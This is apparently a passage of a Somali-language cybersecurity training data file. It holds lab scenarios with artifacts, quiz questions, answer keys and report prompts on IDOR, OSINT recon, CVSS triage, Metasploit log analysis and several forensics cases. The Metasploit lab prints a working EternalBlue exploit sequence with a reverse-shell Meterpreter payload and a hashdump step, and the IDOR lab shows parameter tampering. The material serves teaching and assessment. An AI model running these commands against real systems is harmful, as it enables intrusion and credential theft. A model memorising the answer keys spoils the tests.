      "Falanqee HTTP request/response pair-ka Burp gudihiisa",
      "Aqoonso parameter la beddeli karo si loo helo xog qof kale",
      "Xaqiiji IDOR iyada oo lagu falanqeynayo response-ka",
      "Talo bixi remediation",
    ],
    artifactTitle: "Burp Suite HTTP History (request/response pair)",
    artifact: `Request 1 (session user-ka: alice, account_id=4471):
GET /api/invoices?account_id=4471 HTTP/1.1
Host: app.example.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.alice_session_token

Response 1: 200 OK
{"invoice_id": 9001, "account_id": 4471, "amount": 240.00, "owner": "alice@example.com"}

Request 2 (session isla mid, kaliya account_id la beddelay):
GET /api/invoices?account_id=4472 HTTP/1.1
Host: app.example.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.alice_session_token

Response 2: 200 OK
{"invoice_id": 9002, "account_id": 4472, "amount": 1850.00, "owner": "bob@example.com"}`,
    questions: [
      {
        id: "q1",
        q: "Sababta Request 2 uu tusinayo IDOR waa?",
        options: [
          "Session-ka alice, account_id la beddelay 4472, wuxuu helay xog bob (200 OK, aan authorization check lahayn)",
          "Server-ku wuu diiday request-ka",
          "Response-ku waa 403 Forbidden",
          "Ma jiro qalad",
        ],
        answer: 0,
        explain: "Session-ka alice ma laha xaq uu ku eego invoice bob, laakiin server-ku wuu ogolaaday.",
      },
      {
        id: "q2",
        q: "Sida Burp Repeater loo isticmaali lahaa si loo tijaabiyo IDOR-kan?",
        options: [
          "Dib u dir Request 1, beddel account_id parameter-ka, eeg haddii response-ku muujiyo xog qof kale",
          "Isticmaal Intruder oo keliya",
          "Xir Burp",
          "Beddel session cookie-ga oo keliya",
        ],
        answer: 0,
        explain: "Repeater wuxuu kuu ogolaadaa inaad si degdeg ah u tijaabiso parameters kala duwan.",
      },
      {
        id: "q3",
        q: "IDOR-kan severity-giisu waa?",
        options: [
          "Low — ma jiro xog xasaasi ah",
          "High — xog maaliyadeed macaamiisha kale ayaa laga heli karaa",
          "Informational oo keliya",
          "Ma jiro severity",
        ],
        answer: 1,
        explain: "Financial data qof kale oo la heli karo (invoice amounts, owner emails) waa impact sare.",
      },
      {
        id: "q4",
        q: "Xalka ugu wanaagsan ee IDOR-kan waa?",
        options: [
          "Hubinta authorization server-side ah — xaqiiji in account_id la xiriira session user-ka ka hor xogta la soo celiyo",
          "Ka saarista account_id parameter-ka oo dhan",
          "Kordhinta session timeout",
          "Beddelidda database-ka",
        ],
        answer: 0,
        explain: "Access control checks server-side ah waa xalka waajibka ah ee IDOR.",
      },
    ],
    reportPrompt:
      "Qor vulnerability finding: title, severity, evidence (request/response), business impact, iyo remediation steps.",
  },
  {
    slug: "osint-recon-planning",
    title: "OSINT Recon Planning",
    somali: "Qorsheynta Recon OSINT",
    english: "OSINT Recon Planning",
    level: "Bilow",
    minutes: 25,
    scenario:
      "Waxaad bilaabaysaa authorized external pentest. Passive recon-kaaga wuxuu soo saaray macluumaad OSINT ah. Falanqee oo naqshadee tallaabooyinka xiga.",
    objectives: [
      "Falanqee macluumaad OSINT ah oo la ururiyay",
      "Aqoonso attack surface-ka ka dhashay findings-ka",
      "Kala hormari targets-ka ugu xiisaha badan",
      "Naqshadee tallaabooyinka recon xiga",
    ],
    artifactTitle: "OSINT recon summary (passive)",
    artifact: `Domain: example-corp.so
WHOIS: Registered 2019, registrar privacy-protected
Subdomains discovered (crt.sh): www, mail, vpn, dev-staging, api, admin-portal
Job postings (LinkedIn): "Backend Engineer - Node.js, MongoDB, AWS"
                          "DevOps Engineer - Jenkins, Docker, Kubernetes"
Employee emails found (theHarvester): j.ahmed@example-corp.so, f.omar@example-corp.so (format: f.lastname@)
Shodan: dev-staging.example-corp.so — port 22 open, port 8080 open (Jenkins, no auth banner)`,
    questions: [
      {
        id: "q1",
        q: "Kee ka mid ah subdomains-ka la helay ayaa ugu xiisaha badan attack surface ahaan?",
        options: ["www", "dev-staging", "mail", "vpn"],
        answer: 1,
        explain: "Dev/staging environments badanaa waxay leeyihiin security controls ka liita production.",
      },
      {
        id: "q2",
        q: "Jenkins (port 8080) oo aan banner authentication lahayn dev-staging kor ku xusan wuxuu tilmaamayaa?",
        options: [
          "Caadi, Jenkins marwalba wuu ammaan yahay",
          "Misconfiguration suurtagal ah — CI/CD tool aan la ilaalin, waxaa laga yaabaa access aan la oggolayn",
          "Waa firewall shaqeynaya",
          "Ma jiro macno",
        ],
        answer: 1,
        explain: "Jenkins aan authentication lahayn waa target caan ah oo la exploit-gareeyo (job execution = code execution).",
      },
      {
        id: "q3",
        q: "Email format (f.lastname@) la ogaaday wuxuu u oggolaadaa pentester-ka inuu?",
        options: [
          "Soo qaado guesses email addresses shaqaalaha kale ee la aqoonsan magacooda",
          "Beddelo domain-ka",
          "Xiro email server-ka",
          "Ma jiro isticmaal",
        ],
        answer: 0,
        explain: "Formula-ha email-ku wuxuu u oggolaadaa target list dhisidda social engineering ah.",
      },
      {
        id: "q4",
        q: "Tallaabada xigta ee recon-ka ugu habboon?",
        options: [
          "Active scan dev-staging.example-corp.so si loo xaqiijiyo Jenkins exposure, ku dar warbixinta findings",
          "Isla markiiba exploit Jenkins-ka",
          "Iska dhaaf findings-ka",
          "Bilaaw social engineering iyada oo aan la ogeysiin client-ka",
        ],
        answer: 0,
        explain: "Xaqiijinta (verification) waa tallaabo lagu socdo ka hor exploitation, dhammaan gudaha scope-ka la oggol yahay.",
      },
    ],
    reportPrompt:
      "Qor recon findings summary: subdomains, exposed services, attack surface priorities, iyo qorshaha active recon xiga.",
  },
  {
    slug: "vulnerability-cvss-triage",
    title: "Vulnerability Scan: CVSS Triage",
    somali: "Scan Vulnerability: Kala Hormarinta CVSS",
    english: "Vulnerability Scan: CVSS Triage",
    level: "Dhexe",
    minutes: 30,
    scenario:
      "Vulnerability scanner-ku wuxuu soo saaray 4 findings. Falanqee CVSS scores-ka, xaqiiji true/false positive, oo kala hormari remediation.",
    objectives: [
      "Fasir CVSS scores iyo severity ranges",
      "Aqoonso false positive suurtagal ah",
      "Kala hormari findings-ka business impact ahaan",
      "Naqshadee remediation roadmap",
    ],
    artifactTitle: "Vulnerability scan findings (qayb)",
    artifact: `Finding 1: Apache 2.4.49 — CVE-2021-41773 (Path Traversal/RCE) — CVSS 9.8 — Host: web-prod-01
Finding 2: OpenSSH 8.9 — banner shows "8.9p1" — CVE-2016-XXXX flagged (duugoobay signature match) — CVSS 7.5 — Host: web-prod-01
Finding 3: TLS 1.0 enabled — CVSS 4.3 — Host: web-prod-01 (internal admin panel, VPN-only access)
Finding 4: Default credentials on internal monitoring dashboard (admin/admin) — CVSS 9.1 — Host: monitor-internal-03`,
    questions: [
      {
        id: "q1",
        q: "Finding 1 (CVSS 9.8, Apache path traversal/RCE) waa in loo siiyaa mudnaan?",
        options: [
          "Critical, xal degdeg ah — remote code execution CVSS sare",
          "Low, waa mid la iska daayo",
          "Ma jirto vulnerability dhab ah",
          "Kaliya loo baahan yahay documentation",
        ],
        answer: 0,
        explain: "CVSS 9.8 + RCE waa combination ugu daran — xal 24-48 saac gudahood.",
      },
      {
        id: "q2",
        q: "Finding 2 (OpenSSH 8.9 oo CVE hore loo flagged, banner cusub) waa laga yaabaa?",
        options: [
          "True positive 100%",
          "False positive — banner-ku wuxuu muujinayaa version cusub, CVE-gu wuxuu u dhigmaa version hore (backporting suurtagal ah)",
          "Waa mid aan la baari karin",
          "Waa mid ka daran Finding 1",
        ],
        answer: 1,
        explain: "Waa in la xaqiijiyaa manually — version banner cusub laakiin CVE la xiriira version hore waa signature mismatch caan ah.",
      },
      {
        id: "q3",
        q: "Finding 3 (TLS 1.0, CVSS 4.3, VPN-only internal) marka business context la daro, mudnaantiisu waxay noqon kartaa?",
        options: [
          "Sare ka dhigaysa CVSS-ka keliya",
          "Ka hoosaysa CVSS-ka generic-ka ah, sababtoo ah access-ku waa xaddidan (VPN-only, internal)",
          "Isku mid CVSS-ka",
          "Ma jiro saameyn business context",
        ],
        answer: 1,
        explain: "Exposure xaddidan (VPN-only) wuxuu yareeyaa risk-ka dhabta ah marka la barbardhigo CVSS score generic-ka ah.",
      },
      {
        id: "q4",
        q: "Finding 4 (default credentials admin/admin) waa in loo siiyaa mudnaan?",
        options: [
          "Critical, xitaa haddii internal yahay — access fudud oo aan xirfad u baahnayn",
          "Low, waa internal oo keliya",
          "Ma jirto khatar sababtoo ah waa monitoring dashboard oo keliya",
          "Waa false positive",
        ],
        answer: 0,
        explain: "Default credentials waa mid ugu fudud ee la isticmaali karo, xitaa attacker aan xirfad badan lahayn.",
      },
    ],
    reportPrompt:
      "Qor risk register: finding kasta, CVSS score, business-adjusted priority, true/false positive status, iyo remediation timeline (Critical=48h, High=2 weeks, iwm).",
  },
  {
    slug: "metasploit-exploitation-log",
    title: "Metasploit Exploitation Log Analysis",
    somali: "Falanqaynta Metasploit Console Log",
    english: "Metasploit Exploitation Log Analysis",
    level: "Sare",
    minutes: 35,
    scenario:
      "Waxaad authorized internal pentest ku samaynaysaa lab environment. Falanqee console log-ga Metasploit ee lab-kaaga si aad u fahanto tallaabooyinka exploitation iyo post-exploitation ee dhacay.",
    objectives: [
      "Fasir amarrada Metasploit iyo natiijooyinkooda",
      "Aqoonso exploit, payload iyo Meterpreter session",
      "Sharax privilege escalation-ka dhacay",
      "Naqshadee attack narrative report-ka",
    ],
    artifactTitle: "Metasploit console log (qayb)",
    artifact: `msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.14.22
RHOSTS => 10.10.14.22
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.5
msf6 exploit(ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.14.5:4444
[*] 10.10.14.22:445 - Connecting to target for exploitation.
[+] 10.10.14.22:445 - Connection established for exploitation.
[+] 10.10.14.22:445 - Target OS selected valid for OS indicated by SMB reply
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.14.22:49158)

meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931...
meterpreter > run post/windows/gather/enum_domain`,
    questions: [
      {
        id: "q1",
        q: "exploit/windows/smb/ms17_010_eternalblue wuxuu ka faa'iidaystaa?",
        options: [
          "Vulnerability SMB Windows ah (EternalBlue, MS17-010)",
          "Weak password oo keliya",
          "Web application vulnerability",
          "DNS misconfiguration",
        ],
        answer: 0,
        explain: "EternalBlue waa exploit caan ah oo SMB protocol Windows ah ka faa'iidaysta.",
      },
      {
        id: "q2",
        q: "'getuid' output-ku (NT AUTHORITY SYSTEM) wuxuu muujinayaa?",
        options: [
          "Access user caadi ah oo keliya",
          "Awoodda ugu sarreysa Windows-ka — SYSTEM level access, ka sarreysa xitaa Administrator",
          "Access aan awood lahayn",
          "Session-ku wuu jabay",
        ],
        answer: 1,
        explain: "SYSTEM waa awoodda ugu sarreysa Windows — exploitation-kan wuxuu si toos ah u siiyay full control.",
      },
      {
        id: "q3",
        q: "'hashdump' command-ku wuxuu sameeyaa?",
        options: [
          "Soo saaraa password hashes-ka users-ka system-ka (post-exploitation)",
          "Wuxuu tirtiraa users-ka",
          "Wuxuu sameeyaa backup",
          "Wuxuu xiraa system-ka",
        ],
        answer: 0,
        explain: "hashdump waa post-exploitation module soo saarta credential hashes — muhiim lateral movement ahaan.",
      },
      {
        id: "q4",
        q: "Tallaabada attack narrative-ka warbixinta, sidee loo sharaxi lahaa dhacdadan?",
        options: [
          "SMB service la exploit-gareeyay (EternalBlue) toos ugu socda SYSTEM access la helay, hashes la xaday, domain enumeration la bilaabay (lateral movement potential)",
          "Kaliya 'access la helay'",
          "Kaliya magaca exploit-ka",
          "Ma loo baahna faahfaahin",
        ],
        answer: 0,
        explain: "Attack narrative-ku waa in uu isku xiraa tallaabooyinka talaabo-talaabo ah si loo muujiyo full impact-ka.",
      },
    ],
    reportPrompt:
      "Qor attack narrative: exploit la isticmaalay, access level la helay, post-exploitation actions, iyo remediation (patching MS17-010, network segmentation).",
  },
  {
    slug: "mft-timeline-analysis",
    title: "MFT Timeline Analysis",
    somali: "Falanqaynta Timeline-ka MFT",
    english: "MFT Timeline Analysis",
    level: "Sare",
    minutes: 35,
    scenario:
      "Waxaad haysataa qayb ka mid ah MFT entries oo laptop shirkad ah, oo la shakiyay in xog xasaasi ah la tirtiray si loo qariyo. Falanqee timestamps-ka oo go'aami haddii timestomping dhacay.",
    objectives: [
      "Falanqee MACB timestamps entries kala duwan",
      "Barbardhig $STANDARD_INFORMATION iyo $FILE_NAME",
      "Aqoonso khilaaf muujinaya timestomping",
      "Dhis timeline sax ah oo dhacdada ah",
    ],
    artifactTitle: "MFT entries excerpt (parsed)",
    artifact: `Entry 4521: financial_report_q3.xlsx
  $STANDARD_INFO: Created 2026-03-14 09:12:03, Modified 2026-03-14 09:15:22
  $FILE_NAME:      Created 2024-01-05 08:00:00, Modified 2024-01-05 08:00:00

Entry 4522: vacation_photo.jpg
  $STANDARD_INFO: Created 2026-03-14 09:20:11, Modified 2026-03-14 09:20:11
  $FILE_NAME:      Created 2026-03-14 09:20:11, Modified 2026-03-14 09:20:11

Entry 4523: client_contracts_backup.zip
  $STANDARD_INFO: Created 2026-03-14 09:31:45, Modified 2026-03-14 09:31:45
  $FILE_NAME:      Created 2026-03-14 09:31:45, Modified 2026-03-14 09:31:45`,
    questions: [
      {
        id: "q1",
        q: "Entry 4521 (financial_report_q3.xlsx) wuxuu muujinayaa?",
        options: [
          "Timestomping — khilaaf weyn u dhexeeya $STANDARD_INFO iyo $FILE_NAME",
          "File caadi ah oo aan wax shaki ah lahayn",
          "Backup process",
          "File cusub oo la sameeyay"
        ],
        answer: 0,
        explain: "$STANDARD_INFO wuxuu muujinayaa 2026, $FILE_NAME wuxuu muujinayaa 2024 — khilaaf weyn oo timestomping ah.",
      },
      {
        id: "q2",
        q: "Entry 4522 iyo 4523 waxay muujinayaan?",
        options: [
          "Timestamps caadi ah, ma jiraan khilaaf",
          "Timestomping sidoo kale",
          "Files la tirtiray",
          "Ma jiro macluumaad"
        ],
        answer: 0,
        explain: "Labada attribute way isku mid yihiin — ma jiro calaamad timestomping ah.",
      },
      {
        id: "q3",
        q: "Sababta attacker-ku uu u beddeli lahaa timestamps financial_report_q3.xlsx?",
        options: [
          "Si uu uga muuqdo file-ku mid hore loo sameeyay, ma aha mid la xaday dhawaan",
          "Si uu file-ka u kordhiyo size-kiisa",
          "Ma jiro sabab macquul ah",
          "Si uu u dedejiyo access-ka"
        ],
        answer: 0,
        explain: "Timestomping-ku wuxuu qariyaa waqtiga dhabta ah ee dhaqanka khaldan.",
      },
      {
        id: "q4",
        q: "Timeline-ka dhabta ah ee dhacdada, ee ku salaysan $FILE_NAME (mid adag in la beddelo), waa in aad?",
        options: [
          "Ku kalsoonaato marka la dhisayo timeline dhabta ah",
          "Iska indho tirto oo isticmaal $STANDARD_INFO oo keliya",
          "Isticmaal kaliya file size-ka",
          "Ma jiro faa'iido"
        ],
        answer: 0,
        explain: "$FILE_NAME waa mid adag in la beddelo, sidaas darteed waa mid ka kalsooni badan.",
      },
    ],
    reportPrompt:
      "Qor findings: entries-ka timestomping lagu ogaaday, khilaafka attributes, timeline dhabta ah oo la dhisay $FILE_NAME, iyo talooyin.",
  },
  {
    slug: "memory-dump-process-triage",
    title: "Memory Dump: Process Triage",
    somali: "Memory Dump: Kala Hormarinta Processes",
    english: "Memory Dump: Process Triage",
    level: "Sare",
    minutes: 35,
    scenario:
      "Waxaad haysataa liis processes ah oo laga soo saaray memory dump (Volatility pslist output). Falanqee oo aqoonso process-ka shaki leh.",
    objectives: [
      "Falanqee parent-child process relationships",
      "Aqoonso process names typosquatted ah",
      "Aqoonso processes ka socda meelo aan caadi ahayn",
      "Kala hormari processes-ka baaritaan u baahan",
    ],
    artifactTitle: "Volatility pslist output (qayb)",
    artifact: `PID   PPID  Name           Path
612   488   explorer.exe   C:\\Windows\\explorer.exe
2104  612   chrome.exe     C:\\Program Files\\Google\\Chrome\\chrome.exe
3388  2104  svch0st.exe    C:\\Users\\jsmith\\AppData\\Local\\Temp\\svch0st.exe
4012  488   svchost.exe    C:\\Windows\\System32\\svchost.exe
4501  3388  cmd.exe        C:\\Windows\\System32\\cmd.exe`,
    questions: [
      {
        id: "q1",
        q: "svch0st.exe (PID 3388) waa shaki leh sababtoo ah?",
        options: [
          "Magaca u eg svchost.exe (typosquatting) oo ka socda %TEMP%",
          "Waa process caadi ah oo Windows ah",
          "PID-giisu waa mid caadi ah",
          "Ma jiro sabab shaki ah"
        ],
        answer: 0,
        explain: "svch0st.exe (0 halkii o) oo TEMP folder ka socda waa red flag caan ah.",
      },
      {
        id: "q2",
        q: "svch0st.exe (3388) parent-kiisu (chrome.exe, 2104) wuxuu muujinayaa?",
        options: [
          "Relationship aan caadi ahayn — svchost-style processes badanaa services.exe ayaa dhala",
          "Relationship caadi ah",
          "Chrome update process",
          "Ma jiro macno"
        ],
        answer: 0,
        explain: "Chrome oo dhala process 'svchost-looking' ah waa aan caadi ahayn oo tilmaamaya exploitation.",
      },
      {
        id: "q3",
        q: "cmd.exe (4501) oo uu dhalay svch0st.exe wuxuu tilmaamayaa?",
        options: [
          "Suurtagal ah in process shaki leh uu fulinayo commands (post-exploitation)",
          "Caadi, cmd.exe waligiis waa safe",
          "Backup process",
          "Update Windows"
        ],
        answer: 0,
        explain: "cmd.exe oo ka dhashay process shaki leh waa calaamad execution khaldan.",
      },
      {
        id: "q4",
        q: "Tallaabada xigta ee triage-ka?",
        options: [
          "malfind iyo dlllist svch0st.exe (3388) si loo helo faahfaahin dheeraad ah",
          "Iska dhaaf, waa caadi",
          "Isla markiiba tirtir memory dump-ka",
          "Sug 24 saac"
        ],
        answer: 0,
        explain: "Baaritaan dheeraad ah waa loo baahan yahay process-ka la aqoonsaday inuu shaki leeyahay.",
      },
    ],
    reportPrompt:
      "Qor findings: process-ka shaki leh, sababaha (magac, location, parent-child), iyo tallaabooyinka xiga oo triage ah.",
  },
  {
    slug: "usb-exfiltration-correlation",
    title: "USB Exfiltration Correlation",
    somali: "Isku Xirka USB Exfiltration",
    english: "USB Exfiltration Correlation",
    level: "Dhexe",
    minutes: 30,
    scenario:
      "Shaqaale ka bixi doona shirkadda ayaa la shakiyay inuu xog xaday USB drive isticmaalay. Isku dar USBSTOR registry data iyo LNK file timestamps si aad u xaqiijiso.",
    objectives: [
      "Falanqee USBSTOR registry entries",
      "Falanqee LNK file timestamps",
      "Isku xir USB connection iyo file access",
      "Go'aami intent-ka shaqaalaha",
    ],
    artifactTitle: "USBSTOR + LNK evidence (qayb)",
    artifact: `USBSTOR Registry:
  Device: Kingston DataTraveler 3.0
  Serial: 3AB2019F7C
  First Connected: 2026-03-14 16:02:11
  Last Connected: 2026-03-14 16:24:33

LNK Files (Recent Items) - created 2026-03-14:
  16:04:02 - client_database_export.xlsx (path: E:\\)
  16:08:15 - salary_report_2026.pdf (path: E:\\)
  16:11:40 - source_code_backup.zip (path: E:\\)
  16:23:50 - client_database_export.xlsx (path: E:\\) [re-accessed]`,
    questions: [
      {
        id: "q1",
        q: "E:\\ drive letter-ka LNK files-ka ku jira wuxuu tilmaamayaa?",
        options: [
          "Files-ka waxaa laga furay/koobiyeeyay USB device-ka (Kingston DataTraveler)",
          "Files-ka waxaa laga furay C:\\ drive-ka",
          "Ma jiro xiriir USB-ga",
          "E:\\ waa network drive"
        ],
        answer: 0,
        explain: "USB devices badanaa waxaa loo aqoonsaday drive letter E: ama sarreeya.",
      },
      {
        id: "q2",
        q: "Isku xirka waqtiga USB connection (16:02-16:24) iyo LNK timestamps (16:04-16:23) wuxuu caddeeyaa?",
        options: [
          "Files-ka xasaasi ah waxaa lagu furay/koobiyeeyay muddadii USB-gu xiranaa",
          "Ma jiro xiriir waqti ah",
          "USB-gu marnaba lama xirin",
          "Files-ku waa kuwo hore u jiray"
        ],
        answer: 0,
        explain: "Waqtiyada isku dhow waxay xoojinayaan xiriirka USB iyo file access.",
      },
      {
        id: "q3",
        q: "client_database_export.xlsx oo laba jeer la furay (16:04 iyo 16:23) wuxuu tilmaamayaa?",
        options: [
          "Interest gaar ah oo file-kaas ah, xitaa la soo celiyay",
          "Khalad system ah",
          "Ma jiro macno gaar ah",
          "Backup automatic ah"
        ],
        answer: 0,
        explain: "Re-access-ku wuxuu muujin karaa interest ama xaqiijin dheeraad ah.",
      },
      {
        id: "q4",
        q: "Files-ka la aqoonsaday (client database, salary report, source code) waxay tilmaamayaan?",
        options: [
          "Xog xasaasi ah oo faro badan oo laga yaabo in la xaday — impact weyn",
          "Files caadi ah oo aan xasaasi ahayn",
          "Ma jiro impact",
          "Files-ku waa duplicate oo keliya"
        ],
        answer: 0,
        explain: "Client data, salary iyo source code waa dhammaantood xog aad u xasaasi ah.",
      },
    ],
    reportPrompt:
      "Qor findings: USB device details, timeline USB + LNK correlation, files la xaday, impact assessment, iyo talooyin.",
  },
  {
    slug: "steganography-detection-lab",
    title: "Steganography Detection",
    somali: "Ogaanshaha Steganography",
    english: "Steganography Detection",
    level: "Sare",
    minutes: 30,
    scenario:
      "Waxaad haysataa liis files laga soo qaaday endpoint shaki leh. Falanqee metadata-ga si aad u ogaato haddii steganography la isticmaalay.",
    objectives: [
      "Falanqee file sizes marka la barbardhigo file type-ka",
      "Aqoonso files shaki leh oo cabbirkoodu aan caadi ahayn",
      "Sharax sida steganography loo tijaabin lahaa",
      "Talo bixi tools loo isticmaalo xaqiijinta",
    ],
    artifactTitle: "File listing with metadata (qayb)",
    artifact: `Filename                Type    Dimensions    Size
profile_photo.jpg       JPEG    400x400       48 KB
vacation_beach.jpg      JPEG    1920x1080     312 KB
team_meeting.jpg        JPEG    800x600       89 KB
company_logo.png        PNG     200x200       14.2 MB
sunset_wallpaper.jpg     JPEG    1920x1080     18.7 MB`,
    questions: [
      {
        id: "q1",
        q: "company_logo.png (200x200, 14.2 MB) waa shaki leh sababtoo ah?",
        options: [
          "Cabbirka file-ku aad buu uga weyn yahay waxa loo filayo sawir 200x200 ah",
          "PNG files waligood way ballaaran yihiin",
          "Ma jiro sabab shaki ah",
          "Logo-yadu waligood way weyn yihiin"
        ],
        answer: 0,
        explain: "Sawir 200x200 ah caadi ahaan wuxuu ahaan lahaa dhawr KB, ma aha 14 MB.",
      },
      {
        id: "q2",
        q: "sunset_wallpaper.jpg (1920x1080, 18.7 MB) barbardhigga profile_photo.jpg wuxuu muujinayaa?",
        options: [
          "Size aad uga weyn xaddiga loo filayo, xitaa resolution sare leh",
          "Waa mid caadi ah oo dhammaan wallpapers",
          "Ma jiro farqi la taaban karo",
          "JPEG waligood way weyn yihiin"
        ],
        answer: 0,
        explain: "Xitaa 1920x1080 JPEG, 18.7 MB waa mid aad uga weyn qiyaastii caadiga ah (1-3 MB).",
      },
      {
        id: "q3",
        q: "Tools-ka loo isticmaali lahaa xaqiijinta steganography waxaa ka mid ah?",
        options: [
          "StegExpose, zsteg, ama statistical analysis LSB patterns",
          "Kaliya antivirus scan",
          "Kaliya file rename",
          "Ma jiro tool la isticmaali karo"
        ],
        answer: 0,
        explain: "Tools-kan waxay falanqeeyaan LSB patterns iyo statistical anomalies.",
      },
      {
        id: "q4",
        q: "Haddii steganography la xaqiijiyo files-kan, khatarta ugu weyn waa?",
        options: [
          "Data exfiltration ama malware payload qarsoon",
          "Kaliya storage space luminaya",
          "Ma jiro khatar",
          "Kaliya performance issue"
        ],
        answer: 0,
        explain: "Steganography-ga waxaa loo isticmaali karaa xog qarsoon ama malware qarinta.",
      },
    ],
    reportPrompt:
      "Qor findings: files shaki leh, sababaha (size anomalies), tools loo isticmaali lahaa xaqiijinta, iyo khatarta suurtagalka ah.",
  },
  {
    slug: "windows-event-log-clearing-detection",
    title: "Event Log Clearing Detection",
    somali: "Ogaanshaha Nadiifinta Event Log",
    english: "Event Log Clearing Detection",
    level: "Sare",
    minutes: 30,
    scenario:
      "Server-ka la jebiyay wuxuu muujinayaa Security Event Log oo aad u yar (kaliya 2 saacadood oo events ah). Falanqee oo go'aami haddii log clearing dhacay.",
    objectives: [
      "Aqoonso Event ID 1102 (log cleared)",
      "Falanqee gaps waqti ah events-ka dhexdooda",
      "Sharax sida log recovery loo tijaabin lahaa",
      "Isku xir clearing-ka dhacdooyinka kale",
    ],
    artifactTitle: "Security Event Log excerpt",
    artifact: `Time (UTC)   EventID  Details
14:02:11     4624     Logon: administrator from 10.0.0.15
14:15:33     4672     Special privileges assigned: administrator
14:18:02     1102     The audit log was cleared. Subject: administrator
14:18:05     4624     Logon: administrator from 10.0.0.15
[--- No events between 14:18 and 16:40 despite server being active ---]
16:41:12     4624     Logon: svc_backup from 10.0.0.15`,
    questions: [
      {
        id: "q1",
        q: "Event 1102 14:18:02 wuxuu tilmaamayaa?",
        options: [
          "Audit log-ga waa la nadiifiyay — attacker isku dayay inuu qariyo evidence",
          "Backup caadi ah",
          "Update Windows",
          "Antivirus scan"
        ],
        answer: 0,
        explain: "1102 waa Event ID gaar ah oo log clearing muujiya.",
      },
      {
        id: "q2",
        q: "Gap-ka u dhexeeya 14:18 iyo 16:40 (server oo active ah) wuxuu tilmaamayaa?",
        options: [
          "Dhaqdhaqaaq lagu qariyay marka log-ga la nadiifiyay",
          "Server-ku wuu damaanaa",
          "Caadi ahaan gaps way dhacaan",
          "Ma jiro macno gaar ah"
        ],
        answer: 0,
        explain: "Server active ah oo aan events lahayn muddo dheer waa aan caadi ahayn.",
      },
      {
        id: "q3",
        q: "svc_backup login-ka 16:41:12 (kadib gap-ka) wuxuu u baahan yahay?",
        options: [
          "Baaritaan dheeraad ah — laga yaabo inuu la xiriiro dhaqdhaqaaqa la qariyay",
          "Iska dhaaf, waa caadi",
          "Ma jiro shaki",
          "Waa backup account caadi ah oo aan baaritaan u baahnayn"
        ],
        answer: 0,
        explain: "Account-ka isticmaalka ah kadib log clearing waa in la baaraa.",
      },
      {
        id: "q4",
        q: "Habka log recovery loo tijaabin lahaa gap-ka gudihiisa?",
        options: [
          "Carving unallocated space si loo helo .evtx fragments hore",
          "Iska dhaaf, evidence-ku wuu tirmay 100%",
          "Kaliya sug backup",
          "Ma jiro hab la tijaabin karo"
        ],
        answer: 0,
        explain: "Fragments waxay weli hari karaan xitaa log clearing kadib.",
      },
    ],
    reportPrompt:
      "Qor findings: log clearing evidence, gap analysis, account-yada la xiriira, iyo talooyin log recovery ah.",
  },
  {
    slug: "prefetch-execution-timeline",
    title: "Prefetch Execution Timeline",
    somali: "Timeline-ka Execution-ka Prefetch",
    english: "Prefetch Execution Timeline",
    level: "Dhexe",
    minutes: 30,
    scenario:
      "Waxaad haysataa liis Prefetch files laga soo qaaday endpoint shaki leh. Dhis timeline execution ah oo muujinaya dhacdada.",
    objectives: [
      "Falanqee Prefetch run count iyo timestamps",
      "Aqoonso executables shaki leh",
      "Dhis timeline execution ah",
      "Isku xir findings-ka nooca dhacdada",
    ],
    artifactTitle: "Prefetch file listing (qayb)",
    artifact: `Prefetch File                    Run Count   Last Run (UTC)
WINWORD.EXE-A3F291B2.pf          47          2026-03-14 08:15:22
POWERSHELL.EXE-B821C440.pf       3           2026-03-14 09:02:11
UPDATE_SVC.EXE-D912E871.pf       1           2026-03-14 09:02:45
CMD.EXE-F102A339.pf              12          2026-03-14 09:05:30
RUNDLL32.EXE-C441B902.pf         89          2026-03-14 09:06:02`,
    questions: [
      {
        id: "q1",
        q: "UPDATE_SVC.EXE oo run count 1 leh, la fuliyay 09:02:45, kadib POWERSHELL.EXE (09:02:11) wuxuu tilmaamayaa?",
        options: [
          "PowerShell laga yaabo inuu fuliyay UPDATE_SVC.EXE (execution chain)",
          "Ma jiro xiriir labadan",
          "Caadi ahaan update software",
          "Backup process"
        ],
        answer: 0,
        explain: "Waqtiyada isku dhow iyo run count-ka 1-ka ah waxay muujinayaan first execution.",
      },
      {
        id: "q2",
        q: "Magaca 'UPDATE_SVC.EXE' oo run count 1 keliya leh wuxuu tilmaamayaa?",
        options: [
          "Executable cusub oo la yaqaan, laga yaabo inuu yahay malware",
          "System update caadi ah oo joogto ah",
          "Ma jiro shaki",
          "Waa Windows core file"
        ],
        answer: 0,
        explain: "Run count 1 wuxuu muujiyaa first-time execution — combined with generic name waa shaki.",
      },
      {
        id: "q3",
        q: "RUNDLL32.EXE run count 89 leh wuxuu ka dhigan karaa?",
        options: [
          "Caadi ahaan (Windows wuxuu si joogto ah u isticmaalaa), laakiin waa in la hubiyo command line arguments",
          "Marwalba waa malicious",
          "Ma jiro faa'iido baaritaan",
          "Waa error system ah"
        ],
        answer: 0,
        explain: "RUNDLL32 waa binary caadi ah, laakiin waxaa loo isticmaali karaa si khaldan (living off the land).",
      },
      {
        id: "q4",
        q: "Timeline dhamaystiran ee execution-ka scenario-gan wuxuu muujinayaa?",
        options: [
          "WINWORD (8:15) → PowerShell (9:02) → UPDATE_SVC (9:02) → CMD (9:05) → RUNDLL32 (9:06) — chain shaki leh",
          "Dhammaan waa caadi, ma jiro pattern",
          "Kaliya hal execution",
          "Ma jiro timeline la dhisi karo"
        ],
        answer: 0,
        explain: "Isku xigxiga waqtiga wuxuu muujiyaa attack chain suurtagal ah (phishing doc → PowerShell → payload).",
      },
    ],
    reportPrompt:
      "Qor findings: execution timeline, executables shaki leh, attack chain hypothesis, iyo talooyin baaritaan dheeraad ah.",
  },
  {
    slug: "bitlocker-key-recovery-scenario",
    title: "BitLocker Key Recovery Scenario",
    somali: "Scenario Soo Celinta Furaha BitLocker",
    english: "BitLocker Key Recovery Scenario",
    level: "Sare",
    minutes: 30,
    scenario:
